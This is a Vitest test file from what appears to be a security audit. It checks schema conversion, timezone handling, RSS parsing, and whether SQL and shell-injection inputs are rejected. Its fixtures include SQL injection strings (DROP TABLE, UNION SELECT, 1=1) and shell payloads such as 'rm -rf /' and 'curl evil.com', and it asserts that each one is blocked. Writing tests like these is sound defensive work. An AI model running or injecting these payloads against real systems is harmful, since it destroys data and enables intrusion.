import { describe, it, expect } from "vitest";

// ─── C1: json-schema-to-zod.ts — required array preservation ────────────────

import { jsonSchemaToZod, createOutputZodSchema } from "../../src/utils/json-schema-to-zod.js";

describe("C1 — normalizeStrictObjectSchema preserves required array", () => {
  it("should keep fields not in required as optional", () => {
    const schema = {
      type: "object",
      properties: {
        name: { type: "string" },
        age: { type: "number" },
      },
      required: ["name"],
    };

    const zodSchema = createOutputZodSchema(schema);

    // Only 'name' is required — 'age' is optional
    expect(zodSchema.safeParse({ name: "Alice" }).success).toBe(true);
    expect(zodSchema.safeParse({ name: "Alice", age: 30 }).success).toBe(true);
    expect(zodSchema.safeParse({ age: 30 }).success).toBe(false);
  });

  it("should treat empty required array as all-optional", () => {
    const schema = {
      type: "object",
      properties: {
        x: { type: "string" },
        y: { type: "string" },
      },
      required: [],
    };

    const zodSchema = createOutputZodSchema(schema);
    expect(zodSchema.safeParse({}).success).toBe(true);
    expect(zodSchema.safeParse({ x: "a" }).success).toBe(true);
  });

  it("should force all properties required when no required array present", () => {
    const schema = {
      type: "object",
      properties: {
        x: { type: "string" },
        y: { type: "string" },
      },
    };

    const zodSchema = createOutputZodSchema(schema);
    expect(zodSchema.safeParse({ x: "a", y: "b" }).success).toBe(true);
    expect(zodSchema.safeParse({ x: "a" }).success).toBe(false);
  });
});

// ─── C2: json-schema-to-zod.ts — multi-type unions ──────────────────────────

describe("C2 — handleUnionType handles multi-type unions", () => {
  it("should handle type: ['string', 'number']", () => {
    const zodSchema = jsonSchemaToZod({ type: ["string", "number"] });

    expect(zodSchema.safeParse("hello").success).toBe(true);
    expect(zodSchema.safeParse(42).success).toBe(true);
    expect(zodSchema.safeParse(true).success).toBe(false);
  });

  it("should handle type: ['string', 'null'] (nullable)", () => {
    const zodSchema = jsonSchemaToZod({ type: ["string", "null"] });

    expect(zodSchema.safeParse("hello").success).toBe(true);
    expect(zodSchema.safeParse(null).success).toBe(true);
    expect(zodSchema.safeParse(42).success).toBe(false);
  });

  it("should handle type: ['string', 'number', 'null']", () => {
    const zodSchema = jsonSchemaToZod({ type: ["string", "number", "null"] });

    expect(zodSchema.safeParse("hello").success).toBe(true);
    expect(zodSchema.safeParse(42).success).toBe(true);
    expect(zodSchema.safeParse(null).success).toBe(true);
    expect(zodSchema.safeParse(true).success).toBe(false);
  });
});

// ─── C3: litesql.ts — SQL injection validation ──────────────────────────────

// We test the validation functions by importing the module and calling the
// public functions that use them. We can't import the private functions directly,
// so we test through the public API.

import { insertIntoTableAsync, createDatabaseAsync, createTableAsync, listTablesAsync, queryTableAsync, deleteFromTableAsync, updateTableAsync } from "../../src/helpers/litesql.js";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import { getDatabasesDir } from "../../src/utils/paths.js";

const TEST_DB = "audit_c3_test";

async function cleanupTestDb(): Promise<void> {
  try {
    const dbPath = path.join(getDatabasesDir(), `${TEST_DB}.db`);
    await fs.unlink(dbPath).catch(() => {});
  } catch { /* ignore */ }
}

describe("C3 — litesql SQL injection protection", () => {
  beforeAll(async () => {
    await cleanupTestDb();
    await createDatabaseAsync(TEST_DB);
    await createTableAsync(TEST_DB, "users", [
      { name: "id", type: "INTEGER", primaryKey: true },
      { name: "name", type: "TEXT" },
      { name: "email", type: "TEXT" },
    ]);
    await insertIntoTableAsync(TEST_DB, "users", [
      { id: 1, name: "Alice", email: "alice@example.com" },
      { id: 2, name: "Bob", email: "bob@example.com" },
      { id: 3, name: "Charlie", email: "charlie@example.com" },
    ]);
  });

  afterAll(async () => {
    await cleanupTestDb();
  });

  describe("queryTableAsync WHERE validation", () => {
    it("should allow simple equality: name = 'Alice'", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "name = 'Alice'" });
      expect(result.rows).toHaveLength(1);
      expect(result.rows[0].name).toBe("Alice");
    });

    it("should allow IS NULL", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "email IS NULL" });
      expect(result.rows).toHaveLength(0);
    });

    it("should allow IS NOT NULL", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "email IS NOT NULL" });
      expect(result.rows).toHaveLength(3);
    });

    it("should allow AND conditions: id > 1 AND name = 'Bob'", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "id > 1 AND name = 'Bob'" });
      expect(result.rows).toHaveLength(1);
      expect(result.rows[0].name).toBe("Bob");
    });

    it("should allow OR conditions", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "name = 'Alice' OR name = 'Charlie'" });
      expect(result.rows).toHaveLength(2);
    });

    it("should allow LIKE", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "name LIKE '%li%'" });
      expect(result.rows).toHaveLength(2); // Alice, Charlie
    });

    it("should allow NOT LIKE", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { where: "name NOT LIKE '%li%'" });
      expect(result.rows).toHaveLength(1); // Bob
    });

    it("should reject SQL injection: 1=1", async () => {
      await expect(queryTableAsync(TEST_DB, "users", { where: "1=1" })).rejects.toThrow("Invalid WHERE clause");
    });

    it("should reject SQL injection: semicolon", async () => {
      await expect(queryTableAsync(TEST_DB, "users", { where: "name = 'x'; DROP TABLE users" })).rejects.toThrow("Invalid WHERE clause");
    });

    it("should reject SQL injection: UNION", async () => {
      await expect(queryTableAsync(TEST_DB, "users", { where: "name = 'x' UNION SELECT * FROM users" })).rejects.toThrow("Invalid WHERE clause");
    });

    it("should reject empty WHERE", async () => {
      await expect(queryTableAsync(TEST_DB, "users", { where: "" })).rejects.toThrow("Invalid WHERE clause");
    });

    it("should reject whitespace-only WHERE", async () => {
      await expect(queryTableAsync(TEST_DB, "users", { where: "   " })).rejects.toThrow("Invalid WHERE clause");
    });
  });

  describe("queryTableAsync ORDER BY validation", () => {
    it("should allow ORDER BY name", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { orderBy: "name" });
      expect(result.rows[0].name).toBe("Alice");
    });

    it("should allow ORDER BY name DESC", async () => {
      const result = await queryTableAsync(TEST_DB, "users", { orderBy: "name DESC" });
      expect(result.rows[0].name).toBe("Charlie");
    });

    it("should reject ORDER BY with semicolon", async () => {
      await expect(queryTableAsync(TEST_DB, "users", { orderBy: "name; DROP TABLE users" })).rejects.toThrow("Invalid ORDER BY");
    });
  });

  describe("identifier validation", () => {
    it("should reject table name with semicolon", async () => {
      await expect(queryTableAsync(TEST_DB, 'users"; DROP TABLE users; --')).rejects.toThrow("Invalid table name");
    });

    it("should reject table name starting with number", async () => {
      await expect(queryTableAsync(TEST_DB, "1users")).rejects.toThrow("Invalid table name");
    });
  });

  describe("deleteFromTableAsync WHERE validation", () => {
    it("should allow valid WHERE clause", async () => {
      // Insert a row to delete
      await insertIntoTableAsync(TEST_DB, "users", { id: 99, name: "ToDelete", email: "del@test.com" });
      const result = await deleteFromTableAsync(TEST_DB, "users", "id = 99");
      expect(result.deletedCount).toBe(1);
    });

    it("should reject injection in DELETE WHERE", async () => {
      await expect(deleteFromTableAsync(TEST_DB, "users", "1=1")).rejects.toThrow("Invalid WHERE clause");
    });
  });

  describe("updateTableAsync WHERE validation", () => {
    it("should allow valid UPDATE", async () => {
      const result = await updateTableAsync(TEST_DB, "users", { name: "Updated" }, "id = 1");
      expect(result.updatedCount).toBe(1);
      // Verify
      const check = await queryTableAsync(TEST_DB, "users", { where: "id = 1" });
      expect(check.rows[0].name).toBe("Updated");
      // Restore
      await updateTableAsync(TEST_DB, "users", { name: "Alice" }, "id = 1");
    });

    it("should reject injection in UPDATE WHERE", async () => {
      await expect(updateTableAsync(TEST_DB, "users", { name: "x" }, "1=1")).rejects.toThrow("Invalid WHERE clause");
    });
  });
});

// ─── H8: wallClockToUtcIso timezone conversion ──────────────────────────────

import { wallClockToUtcIso } from "../../src/utils/time.js";

describe("H8 — wallClockToUtcIso timezone conversion", () => {
  it("should convert 3pm New York to 7pm UTC in summer (EDT, UTC-4)", () => {
    const result = wallClockToUtcIso(
      { year: 2026, month: 7, day: 15, hour: 15, minute: 0 },
      "America/New_York",
    );
    expect(result).toBe("2026-07-15T19:00:00.000Z");
  });

  it("should convert 3pm New York to 8pm UTC in winter (EST, UTC-5)", () => {
    const result = wallClockToUtcIso(
      { year: 2026, month: 1, day: 15, hour: 15, minute: 0 },
      "America/New_York",
    );
    expect(result).toBe("2026-01-15T20:00:00.000Z");
  });

  it("should convert midnight Tokyo to previous day 3pm UTC (JST, UTC+9)", () => {
    const result = wallClockToUtcIso(
      { year: 2026, month: 7, day: 15, hour: 0, minute: 0 },
      "Asia/Tokyo",
    );
    expect(result).toBe("2026-07-14T15:00:00.000Z");
  });

  it("should handle UTC timezone (no offset)", () => {
    const result = wallClockToUtcIso(
      { year: 2026, month: 7, day: 15, hour: 12, minute: 30 },
      "UTC",
    );
    expect(result).toBe("2026-07-15T12:30:00.000Z");
  });

  it("should convert Prague noon to 10am UTC in summer (CEST, UTC+2)", () => {
    const result = wallClockToUtcIso(
      { year: 2026, month: 7, day: 15, hour: 12, minute: 0 },
      "Europe/Prague",
    );
    expect(result).toBe("2026-07-15T10:00:00.000Z");
  });
});

// ─── H11: Shell injection in skill-installer.ts ─────────────────────────────

import { validatePackageName } from "../../src/helpers/skill-installer.js";

describe("H11 — validatePackageName blocks shell injection", () => {
  it("should accept valid package names", () => {
    expect(validatePackageName("ffmpeg")).toBe(true);
    expect(validatePackageName("@anthropic/claude")).toBe(true);
    expect(validatePackageName("golang.org/x/tools/cmd/gopls")).toBe(true);
  });

  it("should reject shell metacharacters", () => {
    expect(validatePackageName("legit; rm -rf /")).toBe(false);
    expect(validatePackageName("pkg && curl evil.com")).toBe(false);
    expect(validatePackageName("pkg | sh")).toBe(false);
    expect(validatePackageName("pkg $(whoami)")).toBe(false);
    expect(validatePackageName("pkg `id`")).toBe(false);
    expect(validatePackageName("pkg > /tmp/x")).toBe(false);
  });
});

// ─── H12: Shell injection in dependency-checker.ts ───────────────────────────

import { validateBinaryName } from "../../src/helpers/dependency-checker.js";

describe("H12 — validateBinaryName blocks shell injection", () => {
  it("should accept valid binary names", () => {
    expect(validateBinaryName("ffmpeg")).toBe(true);
    expect(validateBinaryName("node")).toBe(true);
    expect(validateBinaryName("python3")).toBe(true);
  });

  it("should reject shell metacharacters", () => {
    expect(validateBinaryName("legit; curl evil.com")).toBe(false);
    expect(validateBinaryName("bin && whoami")).toBe(false);
    expect(validateBinaryName("bin | sh")).toBe(false);
    expect(validateBinaryName("bin $(id)")).toBe(false);
  });
});

// ─── M25: RSS parser duplicate tags ─────────────────────────────────────────

import { parseRssFeed } from "../../src/utils/rss-parser.js";

describe("M25 — parseRssFeed preserves duplicate tags", () => {
  it("should collect multiple category tags as array", () => {
    const xml = `<?xml version="1.0"?>
      <rss version="2.0">
        <channel>
          <title>Test Feed</title>
          <item>
            <title>Article</title>
            <category>tech</category>
            <category>science</category>
            <category>news</category>
          </item>
        </channel>
      </rss>`;

    const result = parseRssFeed(xml);
    const item = (result.items as Record<string, unknown>[])[0];

    // Should have all three categories, not just the last one
    expect(item.category).toEqual(["tech", "science", "news"]);
  });

  it("should return single category as string", () => {
    const xml = `<?xml version="1.0"?>
      <rss version="2.0">
        <channel>
          <title>Test Feed</title>
          <item>
            <title>Article</title>
            <category>tech</category>
          </item>
        </channel>
      </rss>`;

    const result = parseRssFeed(xml);
    const item = (result.items as Record<string, unknown>[])[0];

    expect(item.category).toBe("tech");
  });
});
